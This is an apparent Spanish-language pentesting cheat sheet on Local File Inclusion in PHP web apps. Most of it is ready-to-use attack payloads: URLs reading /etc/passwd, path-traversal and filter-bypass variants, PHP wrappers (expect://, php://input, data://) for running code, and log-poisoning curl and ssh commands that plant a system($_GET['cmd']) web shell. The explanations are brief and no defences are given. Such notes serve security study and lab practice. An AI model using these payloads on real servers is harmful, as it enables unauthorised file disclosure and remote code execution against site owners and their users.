___

- Tags:

____

# Definición 


La vulnerabilidad de Inclusión de Archivos Locales (LFI, por sus siglas en inglés) es una técnica de explotación común en entornos web donde un atacante puede acceder y visualizar archivos en el servidor comprometido. Esta vulnerabilidad surge principalmente debido a una falta de validación adecuada de los parámetros de entrada en las aplicaciones web. A continuación, se presentan algunos ejemplos de cómo se puede explotar esta vulnerabilidad:

____
# Ejemplos basicos:


```
http://localhost/index.php?parametro=/etc/passwd
```

Este es un ejemplo sencillo de LFI, ya que nos aprovechamos de un parámetro que no sanitiza sus entradas, lo que nos permite observar el contenido de cualquier archivo en la máquina víctima.


```
http://localhost/index.php?parametro=../../../../../../../etc/passwd
```

Con el uso de path traversal podemos evadir sanitizaciones básicas, como aquellas que solo permiten acceder a archivos dentro de la misma carpeta. Esta técnica nos permite salir de la carpeta especificada y así acceder a cualquier archivo en la máquina víctima.

```
http://localhost/index.php?parametro=....//....//....//....//....//etc/passwd
```

Esto sirve para evadir sanitizaciones que eliminan los "../" de los parámetros. Al aprovecharnos de que la función de reemplazo no es recursiva y al colocar "....//" en lugar de "../", si solo elimina una vez el "../", la cadena sigue siendo válida y podemos acceder a cualquier archivo en la máquina víctima.

```
http://localhost/index.php?parametro=....//....//....//....//....//etc/////////././././././//passwd
```


También podemos evadir la sanitización con el uso de múltiples puntos y diagonales.


```
http://localhost/index.php?parametro=../../../../???/pa??wd
```

Si por alguna razón se está utilizando "cat" u otro comando para la lectura de archivos en Linux, el uso de comodines nos permitiría acceder a un archivo específico.

```
http://localhost/index.php?parametro=/etc/passwd%00
```

En versiones antiguas de PHP, se puede utilizar el null byte para evadir la concatenación de extensiones y así poder ver cualquier archivo.

```
http://localhost/index.php?parametro=/etc/passwd/.
```

Con esto podemos evadir alguna sanitización que pueda verificar los últimos caracteres.

___
# Wrappers


```
http://localhost/index.php?parametro=php://filter/convert.base64-encode/resource=<archivo>
```

Este wrapper sirve para visualizar un archivo PHP especificado sin que sea interpretado, pero este se mostrará cifrado en base64.


```
http://localhost/index.php?parametro=php://filter/read=string.rot13/resource=<archivo>
```

Este wrapper sirve para visualizar un archivo PHP especificado sin que sea interpretado, pero este se mostrará cifrado en rot13.


```
http://localhost/index.php?parametro=php://filter/convert.iconv.utf-8.utf-16/resource=<archivo>
```

Este wrapper sirve para ver en texto plano el código PHP de un archivo en específico.

```
http://localhost/index.php?parametro=expect://comando
```

Con este wrapper podemos ejecutar un comando.


```
http://localhost/index.php?parametro=php://input
```

Con este podemos inyectar un comando, pero para eso tenemos que cambiar el método de la petición a POST y mandar el código PHP que se quiera ejecutar.


```
http://localhost/index.php?parametro=data://text/plain;base64,codigo php en base 64
```

Con este wrapper puedes inyectar código PHP a una página enviándolo como base64.


Con la siguiente herramienta puedes hacer filter chains que tambien sirve para inyectar codigo:

- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

____

# Log poisoning 


```bash 
curl -S -X GET "http://dominio" -H "User-Agent: codigo php malicioso"
```

Al hacer una petición GET a una URL cambiando el User-Agent, si tenemos acceso al registro de Apache mediante LFI, podemos ejecutar código PHP malicioso.


```bash 
curl -S -X GET "http://dominio" -H "User-Agent: <?php phpinfo() ?>"
```

Con esto podemos verificar si hay funciones deshabilitadas filtrando disable_functions.

```bash 
curl -S -X GET "http://dominio" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
```

Esto nos permite crear un parámetro y, con el uso de este parámetro, hacer una web shell sencilla.


```bash
ssh '<?php system($_GET["cmd"];)?>'@ip
```

Con esto podemos crear un parámetro y, con el uso de este parámetro, hacer una web shell sencilla, pero ahora viendo los logs de SSH.











